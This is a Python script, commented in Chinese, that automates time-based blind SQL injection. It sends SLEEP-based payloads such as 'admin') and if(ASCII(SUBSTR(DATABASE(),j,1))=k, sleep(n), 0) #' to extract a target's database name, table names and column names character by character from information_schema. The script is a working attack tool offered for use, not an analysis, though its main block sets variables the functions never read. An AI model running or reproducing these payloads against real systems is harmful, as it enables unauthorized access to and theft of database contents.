import requests
import time

star_char = 23
end_char   = 126

def send_payload(url, payload, headers=None, data=None):
    # 发送请求
    url = url.format(payload=payload)
    try:
        start = time.time()
        response = requests.post(url, data=data, headers=headers, timeout=10)
        duration = time.time() - start
        return duration
    except Exception as e:
        print(f"time out: {e}")
        return False

def DBname():
    global wait_time, url, headers
    print("正在获取数据库名称长度")
    length = 0
    for l in range(1, 50):
        payload = f"admin') and if(length(database())={l}, sleep({wait_time}), 0) #"
        print(f"尝试长度 {l}...")
        duration = send_payload(url, payload, headers=headers)
        if duration and duration > wait_time:
            length = l
            print(f"[+] 数据库名长度为: {length}")
            break

    print("开始获取数据库名内容")
    db_name = ''
    for j in range(1, length + 1):
        for k in range(32, 127):
            payload = f"admin') and if(ASCII(SUBSTR(DATABASE(),{j},1))={k}, sleep({wait_time}), 0) #"
            duration = send_payload(url, payload, headers=headers)
            if duration and duration > wait_time:
                db_name += chr(k)
                print(f"[+] 当前数据库名: {db_name}")
                break

def GetTableName():
    global wait_time, url, headers
    print("\n正在获取数据库中的表数量")
    table_count = 0
    for i in range(1, 50):
        payload = f"admin') and if((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())={i}, sleep({wait_time}), 0) #"
        duration = send_payload(url, payload, headers=headers)
        if duration and duration > wait_time:
            table_count = i
            print(f"[+] 表数量为: {table_count}")
            break

    for index in range(0, table_count):
        print(f"\n正在获取第 {index + 1} 个表名长度")
        tb_length = 0
        for l in range(1, 50):
            payload = f"admin') and if(length((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1))={l}, sleep({wait_time}), 0) #"
            duration = send_payload(url, payload, headers=headers)
            if duration and duration > wait_time:
                tb_length = l
                print(f"[+] 表名长度: {tb_length}")
                break

        tb_name = ''
        for pos in range(1, tb_length + 1):
            for ch in range(32, 127):
                payload = f"admin') and if(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1),{pos},1))={ch}, sleep({wait_time}), 0) #"
                duration = send_payload(url, payload, headers=headers)
                if duration and duration > wait_time:
                    tb_name += chr(ch)
                    print(f"[+] 当前表名: {tb_name}")
                    break
        print(f"[√] 表 #{index + 1} 名为: {tb_name}")

def GetColumnNames(table_name):
    global wait_time, url, headers
    # 防止SQL注入符号破坏语句结构
    table_name = table_name.replace("'", "\\'")

    print(f"\n正在获取表 `{table_name}` 的字段数量")
    col_count = 0
    for i in range(1, 50):
        payload = f"admin') and if((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table_name}')={i}, SLEEP({wait_time}), 0)  #"
        duration = send_payload(url, payload, headers=headers)
        if duration and duration > wait_time:
            col_count = i
            print(f"[+] 字段数量为: {col_count}")
            break

    for index in range(0, col_count):
        print(f"\n正在获取第 {index + 1} 个字段名长度")
        col_length = 0
        for l in range(1, 50):
            payload = f"admin') and if(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1))={l}, SLEEP({wait_time}), 0)  #"
            duration = send_payload(url, payload, headers=headers)
            if duration and duration > wait_time:
                col_length = l
                print(f"[+] 字段名长度: {col_length}")
                break

        col_name = ''  
        for pos in range(1, col_length + 1):
            for ch in range(32, 127):
                payload = f"admin') and if(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1),{pos},1))={ch}, SLEEP({wait_time}), 0)#"
                duration = send_payload(url, payload, headers=headers)
                if duration and duration > wait_time:
                    col_name += chr(ch)
                    print(f"[+] 当前字段名: {col_name}")
                    break
        print(f"[√] 字段 #{index + 1}: {col_name}")
    



if __name__ == "__main__":
    base_url = '' #配置你的payload
    time_wait=2 #确定等待的时间
    DBname()
    GetTableName()
    table_name = input("\n请输入你要获取字段的表名: ").strip()
    GetColumnNames(table_name)


